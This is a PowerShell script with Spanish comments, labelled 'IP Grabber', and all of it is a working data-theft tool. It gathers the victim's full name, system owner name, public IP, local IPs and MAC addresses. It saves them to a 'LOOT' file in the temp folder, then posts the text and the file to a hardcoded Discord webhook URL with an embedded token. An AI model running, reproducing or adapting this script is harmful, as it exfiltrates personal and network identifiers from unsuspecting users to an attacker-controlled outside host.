# Definición del nombre del archivo
$FileName = "$env:tmp\$env:USERNAME-LOOT-$(Get-Date -f yyyy-MM-dd_hh-mm).txt"

# Función para obtener el nombre completo del usuario
function Get-fullName {
    try {
        $fullName = (Get-LocalUser -Name $env:USERNAME).FullName
        return $fullName
    } catch {
        return "No se encontró el nombre"
    }
}

# Llama a la función para obtener el nombre completo
$fullName = Get-fullName

# Función para obtener el email del sistema
function Get-email {
    try {
        $email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
        return $email
    } catch {
        return "No Email"
    }
}

# Llama a la función para obtener el email
$email = Get-email

# Obtén la IP pública
try {
    $computerPubIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
} catch {
    $computerPubIP = "Error obteniendo IP pública"
}

# Obtén las IPs locales y la dirección MAC
$localIP = Get-NetIPAddress -InterfaceAlias "*Ethernet*", "*Wi-Fi*" -AddressFamily IPv4 | Select InterfaceAlias, IPAddress, PrefixOrigin | Out-String
$MAC = Get-NetAdapter -Name "*Ethernet*", "*Wi-Fi*" | Select Name, MacAddress, Status | Out-String

# Crear el output
$output = @"
Full Name: $fullName
Email: $email
Public IP: $computerPubIP
Local IPs: $localIP
MAC: $MAC
"@

# Escribir la salida en el archivo
$output > $FileName

# Función para subir datos a Discord
function Upload-Discord {
    param (
        [string]$file,
        [string]$text 
    )

    # URL del webhook de Discord
    $hookurl = "https://discord.com/api/webhooks/1290239942458343460/oPHfUqw_GeGB9tuDDDDz2jyjN21H2L21WGI2QPm0ieOu6l6536N2t6ICNPkv5O4BbDGK"

    # Cuerpo del mensaje
    $Body = @{
        'username' = "IP Grabber"
        'content' = $text
    }

    # Enviar contenido a Discord
    if (-not ([string]::IsNullOrEmpty($text))) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
    }

    # Subir el archivo a Discord
    if (-not ([string]::IsNullOrEmpty($file))) {
        Invoke-RestMethod -Uri $hookurl -Method Post -InFile $file -ContentType 'multipart/form-data'
    }
}

# Envía el archivo y contenido a Discord
Upload-Discord -file $FileName -text $output

